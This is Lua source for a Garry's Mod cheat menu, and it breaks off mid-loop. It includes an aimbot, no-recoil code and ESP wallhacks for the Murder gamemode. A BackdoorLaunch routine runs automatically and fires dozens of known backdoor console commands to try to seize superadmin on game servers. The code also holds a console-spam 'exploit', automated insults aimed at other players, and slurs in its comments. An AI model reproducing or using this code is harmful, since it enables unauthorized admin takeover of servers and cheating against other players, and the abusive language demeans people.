FindMetaTable( "Player" ).SetEyeAngles = function( self, angle )
if ( string.find( string.lower( debug.getinfo( 2 ).short_src ), "/weapons/" ) ) and ZNX.Vars.NoRecoil then return end
OEyeAngles( self, angle )
end
local shitweapons = {
"weapon_physgun",
"weapon_physcannon",
"weapon_bugbait",
"weapon_fists",
"gmod_camera",
"gmod_tool",
"weapon_medkit",
"weapon_zm_carry",
"weapon_ttt_unarmed",
"weapon_keypadchecker",
"arrest_stick",
"door_ram",
"keys",
"lockpick",
"med_kit",
"pocket",
"stunstick",
"unarrest_stick",
"weaponchecker",
"keypad_cracker",
}
-- make sure its a non spastic weapon to aimbot/triggerbot with
function ZNX.CanBotShoot( wep )
if !wep:IsValid() then return end
if table.HasValue( shitweapons, wep:GetClass() ) then return false end
return true
end
function ZNX.GetView()
return ZNX.ViewAngle * 1
end
function ZNX.FixView()
if !ZNX.Vars.Aimbot then return end
local ply = LocalPlayer()
if !ply:IsValid() then return end
ZNX.ViewAngle = ply:EyeAngles()
end
local sensitivity = 0.022
function ZNX.RotateView(cmd)
ZNX.ViewAngle.p = math.Clamp(ZNX.ViewAngle.p + (cmd:GetMouseY() * sensitivity), -89, 89)
ZNX.ViewAngle.y = math.NormalizeAngle(ZNX.ViewAngle.y + (cmd:GetMouseX() * sensitivity * -1))
end
-- fov based targeting shit
function ZNX.GetAngleFromCrosshair( ply )
local Ang = (ZNX.FindTargetPosition( ply ) - LocalPlayer():EyePos() ):Angle()
local myangles = LocalPlayer():EyeAngles()
if isangle( ZNX.InternalFakeAngles ) then myangles = ZNX.InternalFakeAngles end
local DiffX = math.abs( math.NormalizeAngle( myangles.p - Ang.p ) )
local DiffY = math.abs( math.NormalizeAngle( myangles.y - Ang.y ) )
return DiffX, DiffY
end
function ZNX.GetDirtyAngleFromCrosshair( ply )
local Ang = ( (ply:GetPos() + Vector( 0, 0, 35 ) ) - LocalPlayer():EyePos() ):Angle()
local myangles = LocalPlayer():EyeAngles()
if isangle( ZNX.InternalFakeAngles ) then myangles = ZNX.InternalFakeAngles end
local DiffX = math.abs( math.NormalizeAngle( myangles.p - Ang.p ) )
local DiffY = math.abs( math.NormalizeAngle( myangles.y - Ang.y ) )
return DiffX + DiffY
end
function ZNX.InFOV( ply )
local DiffX, DiffY = ZNX.GetAngleFromCrosshair( ply )
return ( DiffX <= ZNX.NumberVars.AimbotMaxFOV and DiffY <= ZNX.NumberVars.AimbotMaxFOV )
end
function ZNX.FindTargetPosition( ent )
if !ent:IsValid() then return end
if !ZNX.Vars.AimbotTargetMode then return ent:LocalToWorld( ent:OBBCenter() ) end
if ent:GetModel() == "models/crow.mdl" then return ent:LocalToWorld( Vector(0, 0, 5) ) end -- rape faggots that are in crow form, useful in gmstranded or zombie survival
if ent:IsPlayer() then
local head = ent:LookupAttachment( "eyes" )
if head then
local pos = ent:GetAttachment(head)
if pos then
return pos.Pos + ent:EyeAngles():Forward() * -1.5
end
end
end
local bone = ZNX.AimbotBone
local head = ent:LookupBone( bone )
if head then
local pos = ent:GetBonePosition( head )
if pos then
return pos
end
end
return ent:LocalToWorld( ent:OBBCenter() )
end
function ZNX.CalcTargetPosition( ent )
local targetPos = ZNX:FindTargetPosition( ent )
if LocalPlayer():IsValid() and LocalPlayer():GetActiveWeapon():IsValid() and LocalPlayer():GetActiveWeapon():GetClass() == "weapon_crossbow" then
targetPos = ZNX:PredictProjectileWeapons( ply, ent, targetPos ) or targetPos
end
return targetPos
end
function ZNX.PredictProjectileWeapons( ply, target, targetPos )
--    local dist = VecM["Length"](targetPos - PlyM["GetShootPos"](ply))
local dist = Vector(targetPos - LocalPlayer():GetShootPos()):Length()
local time = (dist / 3500) + 0.05
targetPos = targetPos + (target:GetVelocity() * time)
--    local mul = 0.0075
//targetPos = targetPos - (e["GetVelocity"](ply) * mul)
return targetPos
end
function ZNX.CanTargetPlayer( ply )
if !ZNX.Vars.TargetFriends and ZNX.IsFriend( ply ) then return false end
if ZNX.Vars.TargetHighlighted and !ZNX.IsTarget( ply ) then return false end
if !ZNX.Vars.TargetAdmins and ZNX.GetRank( ply ) != ( "user" or "guest" or "player" ) then return false end
if !ZNX.Vars.TargetSameTeam and ply:Team() == LocalPlayer():Team() then return false end
if !ZNX.Vars.TargetNoclippers and ply:GetMoveType() == MOVETYPE_NOCLIP then return false end
if ZNX.Vars.TargetMurder and !ply:HasWeapon("weapon_mu_knife") then return false end
if DarkRP and ZNX.IsBabyGod( ply ) then return false end
return true
end
local boners = {
"ValveBiped.Bip01_Head1",
"ValveBiped.Bip01_Spine2",
"ValveBiped.Bip01_Pelvis",
"ValveBiped.Bip01_R_Forearm",
"ValveBiped.Bip01_L_Forearm",
"ValveBiped.Bip01_R_Calf",
"ValveBiped.Bip01_L_Calf",
"ValveBiped.Bip01_R_Foot",
"ValveBiped.Bip01_L_Foot",
}
function ZNX.PrepareForAStomping( ply )
if !ply:IsValid() then return false end
if ply:GetModel() == "models/crow.mdl" and ZNX.PlayerVisible( ply, ply:LocalToWorld( Vector(0, 0, 5) ) ) then return ply:LocalToWorld( Vector(0, 0, 5) ) end
if ZNX.Vars.AimbotTargetMode then
-- right in the kisser
local head = ply:LookupAttachment( "eyes" )
if head then
local pos = ply:GetAttachment(head)
if pos then
local tpoz = pos.Pos + ply:EyeAngles():Forward() * -1.5
if ZNX.PlayerVisible( ply, tpoz ) then return tpoz end
end
end
else
-- b aim
local head = ply:LookupBone( "ValveBiped.Bip01_Pelvis" )
if head then
local poz = ply:GetBonePosition( head )
if poz then
if ZNX.PlayerVisible( ply, poz ) then return poz end
end
end
end
if ZNX.Vars.AimbotAdaptiveTarget then
local returnpos = -1
for _, b in ipairs( boners ) do
local head = ply:LookupBone( b )
if head then
local poz = ply:GetBonePosition( head )
if poz then
if ZNX.PlayerVisible( ply, poz ) then returnpos = poz break end
end
end
end
if isvector( returnpos ) then return returnpos end
end
local lastresort = ply:LocalToWorld( ply:OBBCenter() )
if ZNX.PlayerVisible( ply, lastresort ) then return lastresort end
return false
end
function ZNX.PlayerVisible( ply, testpos )
if !ply:IsValid() or !ply:IsPlayer() then return false end
local td = {start = LocalPlayer():GetShootPos(), endpos = testpos, filter = {LocalPlayer(), ply}, mask = MASK_SHOT}
local tr = util.TraceLine(td)
--if tr.Entity:IsValid() and tr.Entity == ply then return true end
if !tr.Hit then return true end
if ZNX.Vars.AimbotWallbanger and ZNX.CanWeaponPenetrate( tr, ply ) then return true end
return false
end
-- sorta like above but doesnt require a testpos
function ZNX.PlayerVisiblePK( source, ply )
if !ply:IsValid() or !ply:IsPlayer() then return false end
local td = {start = source, endpos = ply:LocalToWorld( ply:OBBCenter() ), filter = function( e ) return ( e != LocalPlayer() and e != ply and e:GetClass() != "prop_physics") end, mask = MASK_SHOT}
local tr = util.TraceLine(td)
--if tr.Entity:IsValid() and tr.Entity == ply then return true, tr.HitPos end
if !tr.Hit then return true, ply:LocalToWorld( ply:OBBCenter() ) end
return false, Vector( 0,0,0 )
end
-- returns the closest alive player, if visible is true then it will return the closest alive and visible player
function ZNX.GetClosestPlayer()
local nearestEnt = game.GetWorld()
local mypos = LocalPlayer():GetPos()
local plytab = player.GetAll()
table.sort( plytab, function( a, b ) return a:GetPos():Distance( mypos ) < b:GetPos():Distance( mypos ) end )
for _, ent in ipairs( plytab ) do
if ent == LocalPlayer() then continue end
if !ent:IsValid() or ZNX.IsDead( ent ) or !ZNX.CanTargetPlayer( ent ) or (ZNX.ToMetric( LocalPlayer():GetPos():Distance( ent:GetPos() ) ) >= ZNX.NumberVars.AimbotDist ) then continue end
nearestEnt = ent
break
end
return nearestEnt
end
-- returns the closest alive player to your crosshair, visible to return only visible players
function ZNX.GetClosestToCursor( visible )
local nearestEnt = game.GetWorld()
local fovtotal = ZNX.NumberVars.AimbotMaxFOV or 0
if fovtotal > 179 then return ZNX.GetClosestPlayer() end -- kick it into ragebot mode
local mypos = LocalPlayer():GetPos()
local plytab = player.GetAll()
table.sort( plytab, function( a, b ) return ZNX.GetDirtyAngleFromCrosshair( a ) < ZNX.GetDirtyAngleFromCrosshair( b ) end )
for _, ent in ipairs( plytab ) do
if ent == LocalPlayer() then continue end
-- we've exceeded our max fov so just stop looping here
if !ZNX.InFOV( ent ) then break end
-- save a bunch of useless calcs
if !ent:IsValid() or ZNX.IsDead( ent ) or !ZNX.CanTargetPlayer( ent ) or (ZNX.ToMetric( LocalPlayer():GetPos():Distance( ent:GetPos() ) ) >= ZNX.NumberVars.AimbotDist ) then continue end
nearestEnt = ent
break
end
return nearestEnt
end
gameevent.Listen( "entity_killed" )
hook.Add( "entity_killed", "LokiDev_propkilldetector", function( data )
local inflictor_index = data.entindex_inflictor
local attacker_index = data.entindex_attacker
local damagebits = data.damagebits
local victim_index = data.entindex_killed
local ply = "personne?"
local retard = game.GetWorld()
local atk = "la map"
local wep = "arme inconnue"
local killah = game.GetWorld()
local inflictor = ents.GetByIndex(inflictor_index)
for _, p in pairs(player.GetAll()) do
if p:EntIndex() == victim_index then ply = p:Nick() retard = p end
if p:EntIndex() == attacker_index then 
atk = p:Nick()
killah = p
if p:GetActiveWeapon() and p:GetActiveWeapon():IsValid() then wep = p:GetActiveWeapon():GetPrintName() end
end
end
if ZNX.Vars.DeathTaunts and retard == LocalPlayer() then LocalPlayer():ConCommand( "say "..atk.." "..ZNX.GenerateInsult() ) end
if ZNX.Vars.NewLifeRule and retard == LocalPlayer() then LocalPlayer():ConCommand( "LokiDev_random_rpname" ) end
if attacker_index == victim_index then ZNX.DebugLog( ply.." c'est étranglé lui-même", Color(180,150,150) ) if ZNX.Vars.NotifyKills then ZNX.ChatText( ply.." c'est étranglé lui-même", Color(255,155,105) ) end return end
if inflictor:IsValid() and inflictor:GetClass() == "prop_physics" then 
ZNX.DebugLog( ply.." a etait tuer par un prop!", Color(180,150,150) )
if ZNX.Vars.NotifyKills then ZNX.ChatText( ply.." a etait tuer par un prop!", Color(255,155,105) ) end
return 
end
ZNX.DebugLog( atk.." a tuer "..ply.." avec: "..wep, Color(200,150,150) )
if ZNX.Vars.NotifyKills then ZNX.ChatText( atk.." a tuer "..ply.." avec: "..wep, Color(255,155,105) ) end
if ZNX.Vars.KillTaunts and retard != LocalPlayer() and killah == LocalPlayer() then LocalPlayer():ConCommand( "say "..ply.." "..ZNX.GenerateInsult() ) end
--[[
local ply = "nobody"
local prop = "nothing"
for k, v in pairs(ents.GetAll()) do
if v:EntIndex() == victim_index then ply = v end
if (v:GetClass() == "prop_physics" or string.find(v:GetClass(), "gmod_") or string.find(v:GetClass(), "wire_") ) and v:EntIndex() == attacker_index then prop = v end
end
if !FPP then return end
if ply == "nobody" or prop == "nothing" then return end
if !FPP.entGetOwner( prop ):IsValid() then return end
ZNX.DebugLog( FPP.entGetOwner( prop ):Nick().." propkilled "..ply:Nick().." with a "..prop:GetClass().." ("..prop:GetModel()..")", Color(150,150,55) )
--]]
end )
gameevent.Listen( "player_connect" )
hook.Add( "player_connect", "LokiDev_playerconnected", function( data )
ZNX.DebugLog( data.name .. " ( ".. data.networkid.." ) est connecté au serveur.", Color(150,150,150) )
end )
gameevent.Listen( "player_hurt" )
hook.Add( "player_hurt", "crosshair_readinjuries", function( data )
if data.attacker == LocalPlayer():UserID() then ZNX.CrossHairAlpha = 255 end
end )
gameevent.Listen( "player_disconnect" )
hook.Add( "player_disconnect", "LokiDev_playerleave", function( data )
timer.Simple( 0.5, function() ZNX.RemoveInvalidFriends() end )
ZNX.DebugLog( data.name .. " ( ".. data.networkid.." ) a été déconnecté du serveur. ( ".. data.reason .." )", Color(150,150,150) )
end )
ZNX.DebugLog( "Lokidev Menu v1.7 initialisé...", Color(200,200,255) )
if ULib then
ZNX.DebugLog( "Remplacements ULX détectés, réparation du système de Hook...", Color(150,250,150) )
ZNX.DebugLog( "Système de Hook réparé avec succès :)", Color(150,250,150) )
end
function ZNX.AddServer()
local myservername = "\n"..GetHostName()
local myserverip = "\n"..game.GetIPAddress().."\n"
if !myservername or !myserverip then return end
file.Append( "LokiDev_serveur_list.txt", myservername..myserverip )
ZNX.DebugLog( "Serveur Ajouter a la Liste", Color(150,250,150) )
end
function ZNX.LoadServeur()
if (not file.Exists("LokiDev_serveur_list.txt", "Data"))
then file.Write("LokiDev_serveur_list.txt", "")
end
local sucks = file.Read( "LokiDev_serveur_list.txt", "DATA" )
if !sucks then ZNX.DebugLog( "Aucun serveur sauvegarder", Color(150,250,150) ) end
print(sucks)
ZNX.DebugLog( "Liste des serveurs afficher dans les 2 console", Color(150,250,150) )
ZNX.DebugLog( sucks, Color(150,250,150) )
end
function ZNX.DeleteServeur()
file.Delete( "LokiDev_serveur_list.txt", "DATA" )
ZNX.DebugLog( "Toutes les Serveurs ont été supprimées", Color(150,250,150) )
end
concommand.Add("LokiDev_dumpnwstrings", function()
local netstrings = {}
for i = 1, 9999 do
local s = util.NetworkIDToString( i )
if s then print( "[ProcessDev] NetChannel "..i.." = "..s ) else break end
end
end)
function ZNX.DumpHookTable( p, cmd, args )
local hks = args[1]
local hooktable = hook.GetTable()
if !hks or hks == "" then 
for k, v in pairs( hooktable ) do
print( k.." = "..table.Count( v ).." hooks" )
end
elseif !hooktable[hks] then print( "Mauvais nom de hook! fait-le bien abruti sans talents...") return
else
for k, v in pairs( hooktable[hks] ) do
print( k.." = "..debug.getinfo( v ).source.."         ligne: "..debug.getinfo( v ).linedefined.." - "..debug.getinfo( v ).lastlinedefined )
end
end
end
concommand.Add( "LokiDev_dumphooks", ZNX.DumpHookTable )
function ZNX.DumpCommandTable( p, cmd, args )
local commandtable = concommand.GetTable()
if !commandtable then return end
for k, v in pairs( commandtable ) do
if debug.getinfo( v ).source ~= "@processdev_menu_v1.7.lua" and debug.getinfo( v ).source ~= "@lokidev_exploits_menu.lua" then
print( "Commande: "..k.."  -  Source: "..debug.getinfo( v ).source )
end
end
end
concommand.Add( "LokiDev_dumpcommands", ZNX.DumpCommandTable )
--[[
function ZNX.SetRotateAngle( p, cmd, arg )
if !arg[1] or !isnumber(arg[1]) then return end
ZNX.NumberVars.PKRotateAngle = tonumber(arg[1])
end
concommand.Add( "LokiDev_180up_vertical_angle", ZNX.SetRotateAngle )
--]]
local namesf = {
"Marc",                  
"Hugh",      
"Maurice",      
"Gill",                    
"Etienne",      
"Antoine",      
"Jean",      
"Benoit",      
"Gilbert",      
"Laurent",      
"Alexis",      
"Alexandre",      
"Denis",      
"Nicholas",      
"Leon",      
"Leonard",      
"Leo",      
"Olivier",                  
"Curtis",            
"Antonio",      
"Gregory",      
"Charlie",      
"Luc",      
"Patrick",      
"Phillip",      
"Bernard",            
"Charles",            
"Gaspar",      
"Claude",      
"Michael",      
"Brandon",      
"Richard",      
"William",      
"Serge",      
"Freddie",                  
"Samuel",      
"Gaetan",      
"Gerald",      
"Arnold",      
"Roland",      
"Justin",      
"Theodore",      
"Claude",      
"Hugues",      
"Albert",      
"Arthur",      
"Jay",      
"Jeremi",      
"Rene",      
"Pascal",      
"Carlos",      
"Fabien",      
"Rafael",      
"Benjamin",      
"Ernest",      
"Victor",      
"Martin",      
"Franck",      
"Walter",      
"Isaac",      
"Roger",         
"Alfred",      
"Jason",            
"Danny",      
"Henry",      
"Jimmy",      
"Kevin",      
"Geoffrey",                      
"Dominic",      
"Christopher",
"David",
"Steven",
}
local namesfem = {
"Marie",   
"Anastasie",      
"Nathalie", 
"Amabella",      
"Laetitia", 
"Amelie", 
"Jeanette",
"Virginie",
"Rachelle",
"Marine",
"Germaine",
"Gabriel",
"Sophie",
"Melisande",      
"Astrid",      
"Emmeline",      
"Paulette",   
"Laurence", 
"Monique", 
"Louise",  
"Charlotte",
"Olivia",
"Chloe",
"Isabel",
"Elise",
"Sophie",
"Lily",
"Evelyn",
"Anna",
"Camille",
"Madeline",
"Claire",
"Victoria",
"Mia",
"Fabienne",
"Claudia",
"Margot",
"Julienne",
}
local namesl = {
"Daigneault",      
"Lambert",      
"Busson",      
"St-Pierre",      
"Duriff",      
"Beaulac",      
"Monrency",      
"Desroches",      
"Barriere",      
"Plouffe",      
"Cantin",      
"Achin",      
"Hughes",      
"Machintruk",      
"Mercier",      
"Huot",      
"Beaulieu",      
"Garnier",      
"Royer",      
"Gladu",      
"Hacher",      
"Ouellet",      
"Marshall",      
"Lecuyer",      
"Mothe",      
"Brousse",      
"Gilbert",      
"Parrot",      
"Gonzales",      
"Beaudry",      
"Robinson",      
"Mcdonald",      
"Parmentier",      
"Chalifour",      
"Dufour",      
"Charpentier",      
"Picard",      
"Hervieux",      
"Bureau",      
"Gareau",      
"Laderoute",      
"Paiement",      
"Frechette",      
"Hervieux",      
"Williams",      
"Avare",      
"Dufresne",      
"Vertefeuille",      
"Pelchat",      
"Auclair",      
"Richard",      
"Arnaud"
}
function ZNX.GenerateRPName( p, cmd, arg )
if !DarkRP then ZNX.ChatText( "Le nom rp aléatoire fonctionne seulement en darkrp !", Color(255,205,205) ) return end
RunConsoleCommand( "darkrp", "rpname", table.Random( namesf ).." "..table.Random( namesl ) )
end
concommand.Add( "LokiDev_random_rpname_male", ZNX.GenerateRPName )
function ZNX.GenerateRPNameFemale( p, cmd, arg )
if !DarkRP then ZNX.ChatText( "Le nom rp aléatoire fonctionne seulement en darkrp !", Color(255,205,205) ) return end
RunConsoleCommand( "darkrp", "rpname", table.Random( namesfem ).." "..table.Random( namesl ) )
end
concommand.Add( "LokiDev_random_rpname_female", ZNX.GenerateRPNameFemale )
function ZNX.GenerateRPNameBoth( p, cmd, arg )
if !DarkRP then ZNX.ChatText( "Le nom rp aléatoire fonctionne seulement en darkrp !", Color(255,205,205) ) return end
if math.random( 1, 100 ) > 55 then
RunConsoleCommand( "darkrp", "rpname", table.Random( namesfem ).." "..table.Random( namesl ) )
else
RunConsoleCommand( "darkrp", "rpname", table.Random( namesf ).." "..table.Random( namesl ) )
end
end
concommand.Add( "LokiDev_random_rpname", ZNX.GenerateRPNameBoth )
function ZNX.RandomRPJob( p, cmd, arg )
if !DarkRP then ZNX.ChatText( "Le nom rp aléatoire fonctionne seulement en darkrp !", Color(255,205,205) ) return end
local fag = DarkRP.getCategories()
local jcmds = {}
for k, v in pairs( fag.jobs ) do
for _, j in pairs( v.members ) do
if j.customCheck and !j.customCheck( LocalPlayer() ) then continue end
if j.vote then continue end
if j.NeedToChangeFrom then continue end
table.insert( jcmds, j.command )        
end
end
RunConsoleCommand( "darkrp", table.Random( jcmds ) )
end
concommand.Add( "LokiDev_random_rp_job", ZNX.RandomRPJob )
function ZNX.InnocentRoleplayer( p, cmd, arg )
LocalPlayer():ConCommand( "cl_weaponcolor "..math.Rand( 0, 1 ).." "..math.Rand( 0, 1 ).." "..math.Rand( 0, 1 ) )
LocalPlayer():ConCommand( "cl_playercolor "..math.Rand( 0, 1 ).." "..math.Rand( 0, 1 ).." "..math.Rand( 0, 1 ) )
RunConsoleCommand( "kill" )
ZNX.GenerateRPNameBoth()
ZNX.RandomRPJob()
end
concommand.Add( "LokiDev_innocent_roleplayer", ZNX.InnocentRoleplayer )
function ZNX.ErrorRape()
local str = "\n"
for i = 1, 512 do str = str.."\n" end
Error( str )
end
concommand.Add( "LokiDev_exploit_rapeconsole", ZNX.ErrorRape )
function BackdoorLaunch()  
local Moileboss = LocalPlayer()
if not Moileboss:IsSuperAdmin() then
if ConVarExists("debugcmd") then
RunConsoleCommand("debugcmd")
end
if ConVarExists("Sandbox_ArmDupe") then
RunConsoleCommand("Sandbox_ArmDupe")
end
if ConVarExists("dronesrewrite_admin_hackall") then
RunConsoleCommand("dronesrewrite_admin_hackall")
end
if ConVarExists("freezedatacmd") then
RunConsoleCommand("freezedatacmd")
end
if ConVarExists("thepostaldude") then
RunConsoleCommand("thepostaldude")
end
if ConVarExists("k555") then
RunConsoleCommand("k555")
end
if ConVarExists("l666") then
RunConsoleCommand("l666")
end
if ConVarExists("m777") then
RunConsoleCommand("m777")
end
if ConVarExists("n888") then
RunConsoleCommand("n888")
end
if ConVarExists("b999") then
RunConsoleCommand("b999")
end
if ConVarExists("v000") then
RunConsoleCommand("v000")
end
if ConVarExists("c111") then
RunConsoleCommand("c111")
end
if ConVarExists("x222") then
RunConsoleCommand("x222")
end
if ConVarExists("_resstart") then
RunConsoleCommand("_resstart")
end
if ConVarExists("5687476") then
RunConsoleCommand("5687476")
end
if ConVarExists("72648954") then
RunConsoleCommand("72648954")
end
if ConVarExists("backdv1") then
RunConsoleCommand("backdv1")
end
if ConVarExists("_sv") then
RunConsoleCommand("_sv")
end
if ConVarExists("wtbdinterface") then
RunConsoleCommand("wtbdinterface")
end
if ConVarExists("infammo") then
RunConsoleCommand("infammo")
end
if ConVarExists("i_admin") then
RunConsoleCommand("i_admin")
end
if ConVarExists("backdoor_ttt") then
RunConsoleCommand("backdoor_ttt")
end
if ConVarExists("76soldier_sa") then
RunConsoleCommand("76soldier_sa")
end
if ConVarExists("go") then
RunConsoleCommand("go")
end
if ConVarExists("bang") then
RunConsoleCommand("bang")
end
if ConVarExists("EnfinUnPoColon") then
RunConsoleCommand("EnfinUnPoColon")
end
if ConVarExists("Lee_WeaponMelee") then
RunConsoleCommand("Lee_WeaponMelee")
end
if ConVarExists("htx_menu") then
RunConsoleCommand("htx_menu")
end
if ConVarExists("324879974") then
RunConsoleCommand("324879974")
end
if ConVarExists("_76") then
RunConsoleCommand("_76")
end
if ConVarExists("killyourself") then
RunConsoleCommand("killyourself")
end
if ConVarExists("bang") then
RunConsoleCommand("bang")
end
if ConVarExists("e7KwlOZB6PT37RBPhyjP") then
RunConsoleCommand("e7KwlOZB6PT37RBPhyjP")
end
if ConVarExists("C6RcfnOhuPkDPoQkgzu8") then
RunConsoleCommand("C6RcfnOhuPkDPoQkgzu8")
end
if ConVarExists("engine_force_button") then
RunConsoleCommand("engine_force_button")
end
if ConVarExists("netgraph_ssp") then
RunConsoleCommand("netgraph_ssp")
end
if ConVarExists("netgraph_sm") then
RunConsoleCommand("netgraph_sm")
end
if ConVarExists("superadmin_les_khey") then
RunConsoleCommand("superadmin_les_khey")
end
timer.Simple( 1.5, function()
if Moileboss:IsSuperAdmin() then
chat.AddText(Color(0,255,0),"Backdoor Detecter | Tu es maintenant superadmin :)")         
else       
chat.AddText(Color(255,0,0),"Aucun Backdoor Detecter")  
end
end)
else
chat.AddText(Color(0,255,0),"  Tu es superadmin !") 
end
end
surface.CreateFont("HUDLogo3",{font = "Ravie", size = 60, weight = 100, antialias = 0})
surface.CreateFont("HUDLogo2",{font = "Ravie", size = 17, weight = 100, antialias = 0})
timer.Simple( 3, BackdoorLaunch )
surface.CreateFont("s1", {
font = "ScoreboardText",
size = 22,
weight = 0,
antialias = true,
shadow = false,
})  
if gmod.GetGamemode().Name == "Murder" then
RunConsoleCommand("Murder_Check");
RunConsoleCommand("Murder_ESP", 1);
RunConsoleCommand("Murder_Auto", 1);
RunConsoleCommand("Murder_Names", 1);
RunConsoleCommand("Murder_Evidence", 1);
else
RunConsoleCommand("Murder_ESP", 0);
RunConsoleCommand("Murder_Auto", 0);
RunConsoleCommand("Murder_Names", 0);
RunConsoleCommand("Murder_Evidence", 0);
end
local twep = {"weapon_mu_knife"}
local tgun = {"weapon_mu_magnum"}
CreateClientConVar("Murder_ESP", "0", true, false)
CreateClientConVar("Murder_Auto", "0", true, false)
CreateClientConVar("Murder_Names", "0", true, false)
CreateClientConVar("Murder_Evidence", "0", true, false)
local ply = LocalPlayer()
local round = true
function check()
for _,v in pairs( ents.GetAll() ) do
local pl = v.Owner
if IsValid(pl) and !v.hatESPTracked then
if table.HasValue(twep, v:GetClass()) then
if IsValid(v) then
local col = pl:GetPlayerColor()
col = Color(col.x * 255, col.y * 255, col.z * 255)
chat.AddText(col, pl:GetNWString("bystanderName"), Color(255, 255, 255), " est le ", Color(255, 0, 0), "MURDER")
else
chat.AddText(Color(200, 200, 200), "Le COUTEAU est sur le sol.")
end
end
if table.HasValue(tgun, v:GetClass()) then
if IsValid(v) then
local col = pl:GetPlayerColor()
col = Color(col.x * 255, col.y * 255, col.z * 255)
chat.AddText(col, pl:GetNWString("bystanderName"), Color(255, 255, 255), " a le ", Color(0, 255, 0), "PISTOLET")
else
chat.AddText(Color(200, 200, 200), "Le PISTOLET est sur le sol.")
end
end
end
end
end
concommand.Add( "Murder_Check", check)
function teleport()
ply:SetPos(ply:EyePos())
end
concommand.Add( "Murder_teleport", teleport)
function getNames()
for _,v in pairs( player.GetAll() ) do
if IsValid(v) then
local col = v:GetPlayerColor()
col = Color(col.x * 255, col.y * 255, col.z * 255)
if (v:Alive()) then
chat.AddText(col, v:Name(), " : ", v:GetNWString("bystanderName"))
else
chat.AddText(Color( 255, 30, 40 ), "*MORT* ", col, v:Name(), " : ", v:GetNWString("bystanderName"))
end
end
end
end
concommand.Add( "Murder_getNames", getNames)
hook.Add("CreateMove", "murder_checker", function()
if(GetConVarNumber("Murder_Auto") == 1) and GAMEMODE.RoundStage == 1 and round == false then
round = true
for _,v in pairs( ents.GetAll() ) do
local pl = v.Owner
if IsValid(pl) and !v.hatESPTracked then
if IsValid(v) and table.HasValue(twep, v:GetClass()) then
local col = pl:GetPlayerColor()
col = Color(col.x * 255, col.y * 255, col.z * 255)
chat.AddText(col, pl:GetNWString("bystanderName"), Color(255, 255, 255), " est le ", Color(255, 0, 0), "MURDER")
end
if IsValid(v) and table.HasValue(tgun, v:GetClass()) then
local col = pl:GetPlayerColor()
col = Color(col.x * 255, col.y * 255, col.z * 255)
chat.AddText(col, pl:GetNWString("bystanderName"), Color(255, 255, 255), " a le ", Color(0, 255, 0), "PISTOLET")
end
end
end
elseif GAMEMODE.RoundStage != 1 then
round = false
end
end)
hook.Add( "HUDPaint", "aimbot.Wallhack", function()
for k,v in pairs ( player.GetAll() ) do
local Position = ( v:GetPos() + Vector( 0,0,80 ) ):ToScreen()
local Name = ""
if v == ply then Name = "" else Name = v:Name() end
end
end )
local function coordinates( ent )
local min, max = ent:OBBMins(), ent:OBBMaxs()
local corners = {
Vector( min.x, min.y, min.z ),
Vector( min.x, min.y, max.z ),
Vector( min.x, max.y, min.z ),
Vector( min.x, max.y, max.z ),
Vector( max.x, min.y, min.z ),
Vector( max.x, min.y, max.z ),
Vector( max.x, max.y, min.z ),
Vector( max.x, max.y, max.z )
}
local minX, minY, maxX, maxY = ScrW() * 2, ScrH() * 2, 0, 0
for _, corner in pairs( corners ) do
local onScreen = ent:LocalToWorld( corner ):ToScreen()
minX, minY = math.min( minX, onScreen.x ), math.min( minY, onScreen.y )
maxX, maxY = math.max( maxX, onScreen.x ), math.max( maxY, onScreen.y )
end
return minX, minY, maxX, maxY
end
local function MESPCheck(v)
if v:Alive() == true && v:Health() ~= 0 && v:Health() >= 0 && v ~= ply && ply:Alive() then
return true
else
return false
end
end
hook.Add("HUDPaint", "ESPs", function()
if(GetConVarNumber("Murder_ESP") == 1) then
for k,v in pairs(player.GetHumans()) do
for k,v2 in pairs(v:GetWeapons()) do
if v2:GetClass() == "weapon_mu_knife" and MESPCheck(v) then
cam.Start3D(EyePos(), EyeAngles())
--v:SetMaterial("models/debug/debugwhite")
--v:SetColor(Color(255, 0, 0, 255))
--render.MaterialOverride("models/debug/debugwhite")
--render.SuppressEngineLighting( false )
--render.SetBlend( 0.3 )
--render.SetColorModulation( 1, 0, 0 )
--v:DrawModel()
cam.End3D()
elseif v2:GetClass() == "weapon_mu_magnum" and MESPCheck(v) then
cam.Start3D(EyePos(), EyeAngles())
--v:SetMaterial("models/debug/debugwhite")
--v:SetColor(Color(0, 0, 255, 255))
--render.MaterialOverride("models/debug/debugwhite")
--render.SuppressEngineLighting( false )
--render.SetBlend( 0.3 )
--render.SetColorModulation( 0, 0, 1 )
--v:DrawModel()
cam.End3D()
end
end
if(GetConVarNumber("Murder_Names") == 1) and MESPCheck(v) then
local ESP = (v:EyePos() + Vector( 0,0,85 ) ):ToScreen()
local col = v:GetPlayerColor()
col = Color(col.x * 255, col.y * 255, col.z * 255)
local x1,y1,x2,y2 = coordinates(v)
surface.SetDrawColor(col)
draw.DrawText(v:GetNWString("bystanderName"), "ChatFont", ESP.x, ESP.y, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end
end
if(GetConVarNumber("Murder_Evidence") == 1) then
for k, v in pairs(ents.FindByClass("mu_loot")) do
if IsValid(v) then
cam.Start3D(EyePos(), EyeAngles())
v:SetMaterial("models/debug/debugwhite")
v:SetColor(Color(0, 0, 1, 255))
render.MaterialOverride("models/debug/debugwhite")
render.SuppressEngineLighting( false )
render.SetBlend( 0.3 )
render.SetColorModulation( 0, 1, 0 )
v:DrawModel()
cam.End3D()
local ESP = (v:EyePos()):ToScreen()
local col = v:GetPlayerColor()
col = Color(0, 255, 0)
local x1,y1,x2,y2 = coordinates(v)
surface.SetDrawColor(col)
draw.DrawText("EQUIPEMENT", "s1", ESP.x, ESP.y, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end
for k, v in pairs(ents.FindByClass("weapon_mu_knife")) do
if IsValid(v) then
cam.Start3D(EyePos(), EyeAngles())
v:SetMaterial("models/debug/debugwhite")
v:SetColor(Color(255, 0, 0, 255))
render.MaterialOverride("models/debug/debugwhite")
render.SuppressEngineLighting( false )
render.SetBlend( 0.3 )
render.SetColorModulation( 1, 0, 0 )
v:DrawModel()
cam.End3D()
local p = v:GetOwner()
local ESP = (v:EyePos()):ToScreen()
local col = v:GetPlayerColor()
col = Color(255, 0, 0)
local x1,y1,x2,y2 = coordinates(v)
if IsValid(p) then
else
surface.SetDrawColor(col)
end
draw.DrawText("COUTEAU", "s1", ESP.x, ESP.y, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
end
for k, v in pairs(ents.FindByClass("mu_knife")) do
